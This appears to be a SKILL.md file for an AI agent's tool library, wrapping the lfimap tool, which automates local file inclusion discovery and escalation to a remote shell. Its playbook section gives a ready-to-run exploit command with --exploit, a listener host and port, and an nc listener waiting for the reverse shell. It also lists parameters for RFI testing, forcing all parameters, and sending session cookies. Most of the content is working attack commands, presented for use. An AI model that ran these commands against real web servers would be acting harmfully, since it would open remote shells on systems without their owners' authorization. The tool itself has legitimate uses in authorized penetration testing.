---
name: lfimap-lfi-autopwn
description: "lfimap automates LFI discovery to shell. Signals: web vulnerability, injection, LFI scanning, automatic reverse shell, test all parameters."
zh-signals: "lfimap: 自动化 LFI 到 shell。信号:web漏洞,注入,LFI 扫描,自动反弹 shell,强制所有参数测试。"
when-to-use: >-
  Use when a web parameter may be vulnerable to local file inclusion and you want
  automated LFI scanning that can escalate to a reverse shell across all parameters.
---

# lfimap

- Attack Category: C09 Web Exploitation (LFI)
- Upstream Repository: https://github.com/hansmach1ne/lfimap
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/hansmach1ne/lfimap && cd lfimap && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 lfimap.py -U 'https://t.com/?file=welcome'` | LFI scan |
| `--exploit -U url --lhost 10.0.0.5 --lport 4444` | Automatic reverse shell |
| `-F` | Force testing of all parameters |
| `--rfi` | Enable RFI testing |
| `--force-ssl` | Force HTTPS |
| `-C 'PHPSESSID=xxx'` | With cookies |

## Attack Scenario Playbook

### Automated LFI to Shell

```bash
python3 lfimap.py -U 'https://t.com/include.php?module=home' --exploit --lhost 10.0.0.5 --lport 4444
# nc -lvnp 4444 waits for the connection
```

## Notes

An LFI automation tool covering the full chain of data://, logs, /proc/self/fd and RFI, saving time compared with manual path traversal.
